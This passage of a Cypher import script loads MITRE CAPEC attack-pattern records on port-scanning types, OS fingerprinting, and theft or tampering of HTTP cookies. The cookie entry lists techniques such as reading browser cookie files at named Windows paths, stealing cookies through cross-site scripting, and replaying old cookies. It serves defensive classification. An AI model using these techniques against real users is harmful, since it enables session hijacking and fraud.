range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, NULL scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, NULL scans are flagged by almost all intrusion prevention or intrusion detection systems.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: TCP NULL scanning is fast compared to other types of scans', '2. Stealth: TCP NULL scanning was once stealthy, but is now easily detected by IDS/IPS systems', '3. Open Port: Detects an open port via no response to the segment', '4. Closed Port: Detects that a closed via a RST received in response to the FIN', '5. Filtered Port: Cannot distinguish between a filtered port and an open port', '6. Unfiltered Port: Cannot distinguish between an unfiltered port and a non-stateful filtered port'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.304.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.304.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.304.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.304.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 173, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send TCP segments with no flags set to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 305, name: "TCP ACK Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 259, text: "<div level=\"0\">\n  <p class=\"text\">ACK scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</p>\n</div>"});
CREATE (:Submission{id: 286});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 280, summary: "OrderedDict([('Text', ['An attacker uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present. When a TCP ACK segment is sent to a closed port, or sent out-of-sync to a listening port, the RFC 793 expected behavior is for the device to respond with a RST. Getting RSTs back in response to a ACK scan gives the attacker useful information that can be used to infer the type of firewall present. Stateful firewalls will discard out-of-sync ACK packets, leading to no response. When this occurs the port is marked as filtered. When RSTs are received in response, the ports are marked as unfiltered, as the ACK packets solicited the expected behavior from a port. When combined with SYN techniques an attacker can gain a more complete picture of which types of packets get through to a host and thereby map out its firewall rule-set. ACK scanning, when combined with SYN scanning, also allows the attacker analyze whether a firewall is stateful or non-stateful. If a SYN solicits a SYN/ACK or a RST and an ACK solicits a RST, the port is unfiltered by any firewall type. If a SYN solicits a SYN/ACK, but an ACK generates no response, the port is statefully filtered. When a SYN generates neither a SYN/ACK or a RST, but an ACK generates a RST, the port is statefully filtered. When neither SYN nor ACK generates any response, the port is blocked by a specific firewall rule, which can occur via any type of firewall.', 'Interpreting the results of ACK scanning requires rather sophisticated analysis. A skilled attacker may use this method to map out firewall rules, but the results of ACK scanning will be less useful to a novice.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: TCP ACK scanning is fast compared to other types of scans', '2. Stealth: TCP ACK scanning is stealthy', '3. Open Port: Cannot detect open ports', '4. Closed Port: Cannot detect closed ports', '5. Filtered Port: Can detect stateful vs. non-stateful filters when combined with SYN probes', '6. Unfiltered Port: Can detect unfiltered ports when combined with SYN probes'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.305.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 55-56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.305.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.305.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.7 TCP ACK Scan, pg. 113", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.305.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 174, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send TCP ACK segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 306, name: "TCP Window Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 260, text: "<div level=\"0\">\n  <p class=\"text\">TCP Window scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</p>\n</div>"});
CREATE (:Submission{id: 287});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 281, summary: "OrderedDict([('Text', ['An attacker engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. This scanning method works against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port.', 'TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. TCP Window scanning is a more reliable means of making inference about operating system versions than port status.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: TCP Window scanning is fast compared to other types of scans', '2. Stealth: TCP Window scanning is relatively stealthy, much like ACK scanning', '3. Open Port: Can detect open ports based on Window size for a limited number of operating systems', '4. Closed Port: Can detect closed ports based on Window size for limited number of operating systems', '5. Filtered Port: Can identify filtered ports when combined with other methods', '6. Unfiltered Port: Can identify unfiltered ports when combined with other methods'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.306.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 55-56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.306.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.306.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.8 TCP Window Scan, pg. 115", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.306.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 175, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 307, name: "TCP RPC Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 261, text: "<div level=\"0\">\n  <p class=\"text\">RPC scanning requires no special privileges when it is performed via a native system utility.</p>\n</div>"});
CREATE (:Submission{id: 288});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 282, summary: "OrderedDict([('Text', ['An attacker scan for RPC services listing on a Unix/Linux host. This type of scan can be obtained via native operating system utilities or via port scanners like nmap. When performed by a scanner, an RPC datagram is sent to a list of UDP ports and the response is recorded. Particular types of responses can be indicative of well-known RPC services running on a UDP port.', 'There are two general approaches to RPC scanning. One is to use a native operating system utility, or script, to query the portmapper/rpcbind application running on port 111. Portmapper will return a list of registered RPC services. Alternately, one can use a port scanner or script to scan for RPC services directly. Discovering RPC services gives the attacker potential targets to attack, as some RPC services are insecure by default.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: Direct RPC scans that bypass portmapper/sunrpc are typically slow compare to other scan types', '2. Stealth: RPC scanning is not stealthy, as IPS/IDS systems detect RPC queries', '3. Open Port: Can only detect open ports when an RPC service responds', '4. Closed Port: Detects closed ports on the basis of ICMP diagnostic messages.', '5. Filtered Port: Cannot identify filtered ports', '6. Unfiltered Port: Cannot identify unfiltered ports'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.307.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-27", local_id: "R.307.2", author: "J. Postel", title: "RFC768 - User Datagram Protocol", pubdate: "August 28, 1980", link: "http://www.faqs.org/rfcs/rfc768.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.307.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 7.5.2 RPC Grinding, pg. 156", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.307.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 176, text: "<div level=\"0\">\n  <p class=\"text\">The ability to craft custom RPC datagrams for use during network reconnaissance. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 308, name: "UDP Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 262, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send UDP datagrams to a host and receive ICMP error messages from that host. In cases where particular types of ICMP messaging is disallowed, the reliability of UDP scanning drops off sharply.</p>\n</div>"});
CREATE (:Submission{id: 289});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 283, summary: "OrderedDict([('Text', ['An attacker engages in UDP scanning to gather information about UDP port status. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port. Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information. UDP scanning is further complicated by rate limiting mechanisms governing ICMP error messages. During a UDP scan, a datagram is sent to a target port. If an ICMP Type 3 Port unreachable error message is returned then the port is considered closed. Different types of ICMP messages can indicate a filtered port.', 'The protocol characteristics of UDP make port scanning inherently more difficult than with TCP, as well as dependent upon ICMP for accurate scanning. Due to ambiguities that can arise between open ports and filtered ports, UDP scanning results often require a high degree of interpretation and further testing to refine. In general, UDP scanning results are less reliable or accurate than TCP-based scanning.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: UDP scanning is very slow due to ICMP rate limiting', '2. Stealth: RPC scanning is relatively stealthy provided the sending rate does not trigger IPS/IDS sensors', '3. Open Port: Infers an open port based on no response, or an occasional response by a well-known service', '4. Closed Port: Detects a closed port using return ICMP diagnostic messages from the host', '5. Filtered Port: Can detect some filtered ports via ICMP diagnostic messages', '6. Unfiltered Port: Can detect unfiltered ports based on some ICMP diagnostic messages'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.308.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 54-69", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-27", local_id: "R.308.2", author: "J. Postel", title: "RFC768 - User Datagram Protocol", pubdate: "August 28, 1980", link: "http://www.faqs.org/rfcs/rfc768.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.308.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.4 RPC Grinding, pg. 101", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.308.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 177, text: "<div level=\"0\">\n  <p class=\"text\">The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 309, name: "Network Topology Mapping", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 263, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 290});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 221});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 284, summary: "OrderedDict([('Text', 'An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.309.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.309.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-10", local_id: "R.309.3", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
MERGE (:Reference{local_id: "R.309.4", author: "ATT&CK Project", title: "Local networking enumeration (1016)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Local_networking_enumeration"});
CREATE (:ResourcesRequired{id: 178, text: "<div level=\"0\">\n  <p class=\"text\">Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.</p>\n</div>"});
CREATE (:AttackPattern{id: 31, name: "Accessing/Intercepting/Modifying HTTP Cookies", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 264, text: "<div level=\"0\">\n  <p class=\"text\">Target server software must be a HTTP daemon that relies on cookies.</p>\n</div>"});
CREATE (:Submission{id: 291});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 222});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 285, summary: "OrderedDict([('Text', ['This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems.', 'The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein.', 'The second form of this attack involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the attacker to impersonate the remote user/session.', \"The third form is when the cookie's content is modified by the attacker before it is sent back to the server. Here the attacker seeks to convince the target server to operate on this falsified information.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Obtain copy of cookie", description: "<div level=\"0\">\n  <p class=\"text\">The attacker first needs to obtain a copy of the cookie. The attacker may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Obtain cookie from local filesystem (e.g. C:\\Documents and Settings\\*\\Cookies and C:\\Documents and Settings\\*\\Application Data\\Mozilla\\Firefox\\Profiles\\*\\cookies.txt in Windows)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Sniff cookie using a network sniffer such as Wireshark</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Obtain cookie from local memory or filesystem using a utility such as the Firefox Cookie Manager or AnEC Cookie Editor.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Steal cookie via a cross-site scripting attack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Guess cookie contents if it contains predictable information.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Cookies used in web application.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Cookies not used in web application.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Cookie captured by attacker."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Cookie cannot be captured by attacker."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Obtain sensitive information from cookie", description: "<div level=\"0\">\n  <p class=\"text\">The attacker may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Analyze the cookie's contents to determine whether it contains any sensitive information.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Cookie only contains a random session ID (e.g. ASPSESSIONID, JSESSIONID, etc.)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Cookie contains sensitive information (e.g. \"ACCTNO=0234234\", or \"DBIP=0xaf112a22\" -- database server's IP address).</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Cookie's contents cannot be deciphered.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Cookie contains sensitive information that developer did not intent the end user to see."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Cookie does not contain any sensitive information."});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Modify cookie to subvert security controls.", description: "<div level=\"0\">\n  <p class=\"text\">The attacker may be able to modify or replace cookies to bypass security controls in the application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Modify logical parts of cookie and send it back to server to observe the effects.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Modify cookie bitwise and send it back to server to observe the effects.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a \"points balance\" for a given user where the points have some value. The user may spend his points and then replace his cookie with an older one to restore his balance.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Subversion of security controls on server"});
CREATE (:Outcome{id: 2, type: "Failure", description: "Cookie reset by server"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.31.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 565});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 311});
MERGE (:CWE{id: 113});
MERGE (:CWE{id: 539});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 315});
MERGE (:CWE{id: 384});
MERGE (:CWE{id: 472});
MERGE (:CWE{id: 724});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 642});
CREATE (:ResourcesRequired{id: 179, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send HTTP request containing cookie to server</p>\n</div>"});
CREATE (:AttackPattern{id: 310, name: "Scanning for Vulnerable Software", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 265, text: "<div level=\"0\">\n  <p class=\"text\">Access to the network on which the targeted system resides.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 266, text: "<div level=\"0\">\n  <p class=\"text\">Software tools used to probe systems over a range of ports and protocols.</p>\n</div>"});
CREATE (:Submission{id: 292});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 223});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 286, summary: "OrderedDict([('Text', 'An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.310.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.310.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-10", local_id: "R.310.3", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 180, text: "<div level=\"0\">\n  <p class=\"text\">Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.</p>\n</div>"});
CREATE (:AttackPattern{id: 311, name: "DEPRECATED: OS Fingerprinting", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 293});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 224});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Modification{id: 225});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Resources_Required, Target_Attack_Surface, Target_Attack_Surface_Localities, Target_Attack_Surface_Types, Target_Functional_Services, Targeted_OSI_Layers, Typical_Severity"});
CREATE (:PreviousEntryName{id: 63, name: "OS Fingerprinting"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 287, summary: "OrderedDict([('Text', 'This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the standard level patterns CAPEC-312 : Active OS Fingerprinting or CAPEC-313 : Passive OS Fingerprinting going forward, or to any of the detailed patterns that children of them.')])"});
CREATE (:AttackPattern{id: 312, name: "Active OS Fingerprinting", status: "Stable", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 267, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 294});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 226});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 288, summary: "OrderedDict([('Text', \"An adversary engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.312.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.312.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.312.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.312.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 181, text: "<div level=\"0\">\n  <p class=\"text\">Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.</p>\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 313, name: "Passive OS Fingerprinting", status: "Stable", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
